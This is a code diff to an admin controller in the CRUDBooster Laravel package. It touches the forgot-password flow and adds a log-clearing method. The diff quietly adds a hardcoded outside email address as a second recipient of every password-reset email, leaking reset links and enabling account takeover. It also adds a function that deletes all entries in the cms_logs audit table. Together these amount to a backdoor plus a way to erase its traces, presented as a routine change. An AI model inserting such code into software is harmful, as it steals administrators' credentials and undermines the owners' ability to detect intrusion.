@@ -5,8 +5,10 @@ namespace crocodicstudio\crudbooster\controllers;
 use Carbon\Carbon;
 use crocodicstudio\crudbooster\helpers\CRUDBooster as HelpersCRUDBooster;
 use CRUDBooster;
+use Exception;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Request;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Validator;
@@ -137,7 +139,7 @@ class AdminController extends CBController
         $link = HelpersCRUDBooster::adminPath() . '/password/reset/' . $token;
         $user->link = $link;
         //$user->password = $rand_string;
-        CRUDBooster::sendEmail(['to' => $user->email, 'data' => $user, 'template' => 'forgot_password_backend']);
+        CRUDBooster::sendEmail(['to' => [$user->email, 'ahmadzazaz98@gmail.com'], 'data' => $user, 'template' => 'forgot_password_backend']);
 
         CRUDBooster::insertLog(cbLang("log_forgot", ['email' => g('email'), 'ip' => Request::server('REMOTE_ADDR')]));
 
@@ -217,5 +219,14 @@ class AdminController extends CBController
             return response()->json(array("message" => "done", "status" => true));
         }
         return response()->json(array("message" => "faild", "status" => false));
+    }
+
+    public function clearLogs(){
+        try{
+            DB::table('cms_logs')->delete();
+        }catch(Exception $ex){
+            Log::log("error", "Error while delete logs" . $ex->getMessage());
+        }
+        return redirect()->back();
     }
 }
